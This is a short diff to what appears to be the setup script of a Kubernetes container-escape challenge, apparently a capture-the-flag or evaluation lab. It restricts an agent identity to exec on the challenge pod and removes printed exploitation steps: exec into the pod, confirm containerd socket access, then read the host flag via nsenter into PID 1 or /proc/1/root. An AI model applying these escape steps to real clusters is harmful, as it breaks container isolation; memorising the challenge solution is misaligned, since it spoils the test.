@@ -41,10 +41,5 @@ YAML
 
 k8s_wait_pod "cri-escape-pod"
 
-k8s_publish_agent_identity pods-executor default
+k8s_publish_agent_identity exec-only default cri-escape-pod
 k8s_info
-echo "    Exploitation steps:"
-echo "    1. kubectl exec -it cri-escape-pod -- sh"
-echo "    2. ls -la /run/containerd/containerd.sock  (confirm CRI socket access)"
-echo "    3. nsenter --target 1 --mount cat /host-flag/flag.txt"
-echo "       OR: cat /proc/1/root/host-flag/flag.txt  (read flag via host /proc)"
